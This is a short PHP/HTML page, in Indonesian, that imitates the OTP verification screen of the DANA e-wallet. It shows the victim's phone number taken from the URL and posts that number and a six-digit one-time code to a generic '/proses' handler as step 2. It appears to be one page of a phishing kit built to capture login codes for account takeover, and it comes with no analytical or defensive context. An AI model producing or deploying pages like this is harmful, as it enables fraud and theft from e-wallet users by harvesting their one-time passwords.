<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi OTP - DANA</title>
    <link rel="stylesheet" href="/assets/style.css">
</head>
<body>
    <div class="app-container">
        <div class="header"><div class="logo"><svg viewBox="0 0 240 70" width="150" height="44"><text x="0" y="52" font-family="Arial" font-size="48" font-weight="900" fill="white">DANA</text></svg></div></div>
        <div class="content">
            <h2>Verifikasi OTP</h2>
            <p class="subtitle">Kode OTP telah dikirim ke <strong><?= htmlspecialchars($_GET['phone'] ?? '') ?></strong></p>
            <form action="/proses" method="POST">
                <input type="hidden" name="step" value="2">
                <input type="hidden" name="phone" value="<?= htmlspecialchars($_GET['phone'] ?? '') ?>">
                <div class="input-group">
                    <label>Kode OTP</label>
                    <div class="input-wrapper"><input type="text" name="otp" maxlength="6" placeholder="______" required></div>
                </div>
                <button type="submit" class="btn-primary">VERIFIKASI</button>
            </form>
        </div>
    </div>
</body>
</html>